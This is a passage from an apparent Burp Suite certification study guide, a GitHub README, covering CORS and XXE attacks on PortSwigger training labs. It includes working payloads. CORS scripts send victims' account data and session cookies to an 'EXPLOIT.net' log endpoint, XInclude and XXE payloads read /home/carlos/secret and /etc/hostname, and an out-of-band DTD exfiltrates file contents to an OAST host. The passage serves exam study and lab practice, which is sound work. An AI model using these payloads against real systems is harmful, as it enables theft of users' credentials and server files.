req.withCredentials = true;req.send();function reqListener() {location='https://EXPLOIT.NET/log?key='%2bthis.responseText; };%3c/script\u0026gt;\u0026amp;storeId=1\u0026quot;\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003elocation\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"http://stock.TARGET.net/?productId=4\u0026lt;script\u0026gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://TARGET.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://EXPLOIT.NET/log?key='%2bthis.responseText; };%3c/script\u0026gt;\u0026amp;storeId=1\"\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cors/lab-breaking-https-attack\" rel=\"nofollow\"\u003ePortSwigger Lab: CORS vulnerability with trusted insecure protocols\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eNull origin trusted\u003c/h3\u003e\u003ca id=\"user-content-null-origin-trusted\" class=\"anchor\" aria-label=\"Permalink: Null origin trusted\" href=\"#null-origin-trusted\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIdentify the CORS insecure configuration by checking the AJAX response if it contains the \u003ccode\u003eAccess-Control-Allow-Credentials\u003c/code\u003e, then add header \u003ccode\u003eOrigin: null\u003c/code\u003e. If the \u003ccode\u003enull\u003c/code\u003e origin is reflected in the \u003ccode\u003eAccess-Control-Allow-Origin\u003c/code\u003e header it is vulnerable.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePayload that may work in BSCP exam to obtain the administrator account API and session cookie data. Host on exploit server.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;iframe sandbox=\u0026quot;allow-scripts allow-top-navigation allow-forms\u0026quot; srcdoc=\u0026quot;\u0026lt;script\u0026gt;\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','https://TARGET.net/account_api/?EPOCHtime=1679134272000',true);\n    req.withCredentials = true;\n    req.send();\n    function reqListener() {\n        location='https://EXPLOIT.net/log?key='+encodeURIComponent(this.responseText);\n    };\n\u0026lt;/script\u0026gt;\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esandbox\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eallow-scripts allow-top-navigation allow-forms\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003esrcdoc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e    var req = new XMLHttpRequest();\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e    req.onload = reqListener;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e    req.open('get','https://TARGET.net/account_api/?EPOCHtime=1679134272000',true);\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e    req.withCredentials = true;\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e    req.send();\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e    function reqListener() {\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        location='https://EXPLOIT.net/log?key='+encodeURIComponent(this.responseText);\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e    };\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/CORS-NULL.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/CORS-NULL.png\" alt=\"CORS-NULL trusted\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack\" rel=\"nofollow\"\u003ePortSwigger Lab: CORS vulnerability with trusted null origin\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eData Exfiltration\u003c/h1\u003e\u003ca id=\"user-content-data-exfiltration\" class=\"anchor\" aria-label=\"Permalink: Data Exfiltration\" href=\"#data-exfiltration\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eXXE Injections\u003c/h2\u003e\u003ca id=\"user-content-xxe-injections\" class=\"anchor\" aria-label=\"Permalink: XXE Injections\" href=\"#xxe-injections\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#identify-xml\"\u003eXXE Identify\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#xinclude-file-read\"\u003eXXE Xinclude file read\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#dtd-blind-out-of-band\"\u003eXXE DTD Blind Out-of-band\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#dtd-blind-error-messages\"\u003eXXE DTD Blind Error messages\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#sql--xml--hackvertor\"\u003eXXE SQLi inside XML + HackVertor\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#xxe--ssrf\"\u003eXXE perform SSRF\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#xxe-via-svg-image-upload\"\u003eXXE with SVG upload\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/botesjuan/cpts-quick-references/blob/main/module/Web-Attacks.md#xxe\"\u003eHackTheBox XML External Entity Injection - Private Github\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eFile upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eIdentify XML\u003c/h3\u003e\u003ca id=\"user-content-identify-xml\" class=\"anchor\" aria-label=\"Permalink: Identify XML\" href=\"#identify-xml\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePossible to find XXE attack surface in requests that do not contain any XML.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTo \u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e XXE in not so obvious parameters or requests, require adding the below and URL encode the \u003cstrong\u003e\u0026amp;\u003c/strong\u003e ampersand symbol to see the response.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"%26entity;\"\u003e\u003cpre\u003e%26entity;\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBelow the server respond with indication that XML Entities are not allowed for security reasons.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-xxe.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-xxe.png\" alt=\"Identify XML Injections\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eXinclude file read\u003c/h3\u003e\u003ca id=\"user-content-xinclude-file-read\" class=\"anchor\" aria-label=\"Permalink: Xinclude file read\" href=\"#xinclude-file-read\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWebapp \u003cstrong\u003eCheck Stock\u003c/strong\u003e feature use server-side XML document that is server side parsed inside XML document, and request is not constructed of the entire XML document, it is not possible to use a hosted DTD file. Injecting an \u003cstrong\u003eXInclude\u003c/strong\u003e statement to retrieve the contents of \u003ccode\u003e/home/carlos/secret\u003c/code\u003e file instead.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;foo xmlns:xi=\u0026quot;http://www.w3.org/2001/XInclude\u0026quot;\u0026gt;\u0026lt;xi:include parse=\u0026quot;text\u0026quot; href=\u0026quot;file:///home/carlos/secret\u0026quot;/\u0026gt;\u0026lt;/foo\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;\u003cspan class=\"pl-ent\"\u003efoo\u003c/span\u003e \u003cspan class=\"pl-e\"\u003exmlns\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e:\u003c/span\u003e\u003cspan class=\"pl-e\"\u003exi\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://www.w3.org/2001/XInclude\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\u0026lt;\u003cspan class=\"pl-ent\"\u003exi\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003e:\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einclude\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eparse\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003etext\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003ehref\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003efile:///home/carlos/secret\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e/\u0026gt;\u0026lt;/\u003cspan class=\"pl-ent\"\u003efoo\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xinclude.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xinclude.png\" alt=\"XInclude to retrieve files\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eURL encode the XXE payload before sending.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;foo+xmlns%3axi%3d\u0026quot;http%3a//www.w3.org/2001/XInclude\u0026quot;\u0026gt;\u0026lt;xi%3ainclude+parse%3d\u0026quot;text\u0026quot;+href%3d\u0026quot;file%3a///etc/hostname\u0026quot;/\u0026gt;\u0026lt;/foo\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;\u003cspan class=\"pl-ent\"\u003efoo\u003c/span\u003e+xmlns%3axi%3d\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp%3a//www.w3.org/2001/XInclude\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\u0026lt;\u003cspan class=\"pl-ent\"\u003exi\u003c/span\u003e%3ainclude+parse%3d\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003etext\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e+href%3d\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003efile%3a///etc/hostname\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e/\u0026gt;\u0026lt;/\u003cspan class=\"pl-ent\"\u003efoo\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/xxe/lab-xinclude-attack\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting XInclude to retrieve files\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDTD Blind Out-of-band\u003c/h3\u003e\u003ca id=\"user-content-dtd-blind-out-of-band\" class=\"anchor\" aria-label=\"Permalink: DTD Blind Out-of-band\" href=\"#dtd-blind-out-of-band\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOn the exploit server change the hosted file name to \u003ccode\u003e/exploit.dtd\u003c/code\u003e as the exploit file with \u003cstrong\u003eDocument Type Definition (DTD)\u003c/strong\u003e extension, containing the following payload. The \u003ccode\u003e\u0026amp;#x25;\u003c/code\u003e is the Unicode hex character code for percent sign \u003ccode\u003e%\u003c/code\u003e. \u003cstrong\u003e\u003ca href=\"https://academy.hackthebox.com/module/134/section/1206\" rel=\"nofollow\"\u003eParameter entities\u003c/a\u003e\u003c/strong\u003e are referenced using the \u003cstrong\u003epercent\u003c/strong\u003e character instead of the usual ampersand.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;!ENTITY % file SYSTEM \u0026quot;file:///home/carlos/secret\u0026quot;\u0026gt;\n\u0026lt;!ENTITY % eval \u0026quot;\u0026lt;!ENTITY \u0026amp;#x25; exfil SYSTEM 'http://OASTIFY.COM/?x=%file;'\u0026gt;\u0026quot;\u0026gt;\n%eval;\n%exfil;\"\u003e\u003cpre\u003e\u0026lt;!ENTITY % file SYSTEM \"file:///home/carlos/secret\"\u0026gt;\n\u0026lt;!ENTITY % eval \"\u0026lt;!ENTITY \u003cspan class=\"pl-c1\"\u003e\u0026amp;#x25;\u003c/span\u003e exfil SYSTEM 'http://OASTIFY.COM/?x=%file;'\u0026gt;\"\u0026gt;\n%eval;\n%exfil;\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/exploit.dtd.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/exploit.dtd.png\" alt=\"Exploit.DTD file hosted\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eModify the file upload XML body of the request before sending to the target server.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\n\u0026lt;!DOCTYPE users [\u0026lt;!ENTITY % xxe SYSTEM \u0026quot;https://EXPLOIT.net/exploit.dtd\u0026quot;\u0026gt; %xxe;]\u0026gt;\n\u0026lt;users\u0026gt;\n    \u0026lt;user\u0026gt;\n        \u0026lt;username\u0026gt;Carl Toyota\u0026lt;/username\u0026gt;\n        \u0026lt;email\u0026gt;carlos@hacked.net\u0026lt;/email\u0026gt;\n    \u0026lt;/user\u0026gt;    \n\u0026lt;/users\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;?\u003cspan class=\"pl-ent\"\u003exml\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e version\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1.0\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e encoding\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eUTF-8\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e?\u0026gt;\n\u0026lt;!\u003cspan class=\"pl-ent\"\u003eDOCTYPE\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eusers\u003c/span\u003e [\u0026lt;!\u003cspan class=\"pl-k\"\u003eENTITY\u003c/span\u003e % \u003cspan class=\"pl-c1\"\u003exxe\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e SYSTEM \u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttps://EXPLOIT.net/exploit.dtd\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt; \u003cspan class=\"pl-c1\"\u003e%xxe;\u003c/span\u003e]\u0026gt;\n\u0026lt;\u003cspan class=\"pl-ent\"\u003eusers\u003c/span\u003e\u0026gt;\n    \u0026lt;\u003cspan class=\"pl-ent\"\u003euser\u003c/span\u003e\u0026gt;\n        \u0026lt;\u003cspan class=\"pl-ent\"\u003eusername\u003c/span\u003e\u0026gt;Carl Toyota\u0026lt;/\u003cspan class=\"pl-ent\"\u003eusername\u003c/span\u003e\u0026gt;\n        \u0026lt;\u003cspan class=\"pl-ent\"\u003eemail\u003c/span\u003e\u0026gt;carlos@hacked.net\u0026lt;/\u003cspan class=\"pl-ent\"\u003eemail\u003c/span\u003e\u0026gt;\n    \u0026lt;/\u003cspan class=\"pl-ent\"\u003euser\u003c/span\u003e\u0026gt;    \n\u0026lt;/\u003cspan class=\"pl-ent\"\u003eusers\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/blind-xxe-exploit-dtd.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/blind-xxe-exploit-dtd.png\" alt=\"Exploiting blind XXE to exfiltrate data using a malicious exploit DTD file\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eRabbit hole:\u003c/strong\u003e The submit feedback and screenshot upload on feedback is not to be followed by \u003cem\u003e\u003cstrong\u003eNeo\u003c/strong\u003e\u003c/em\u003e down the Matrix.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eIdentify Existing DTD Files\u003c/h3\u003e\u003ca id=\"user-content-identify-existing-dtd-files\" class=\"anchor\" aria-label=\"Permalink: Identify Existing DTD Files\" href=\"#identify-existing-dtd-files\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eReference list of existing DTD fileS on servers \u003ca href=\"https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt\"\u003eGoSecure dtd-finder dtd_files.txt\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003eThe following XML payload in POST body can be used to identify existing DTD files on target server:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone='no'?\u0026gt;\n\u0026lt;!DOCTYPE skippy [\u0026lt;!ENTITY % peanuts SYSTEM \u0026quot; PAYLOAD_POSITION \u0026quot;\u0026gt;%peanuts; ]\u0026gt;\n\u0026lt;stockCheck\u0026gt;\n \u0026lt;productId\u0026gt;\n  1\n \u0026lt;/productId\u0026gt;\n \u0026lt;storeId\u0026gt;\n  1\n 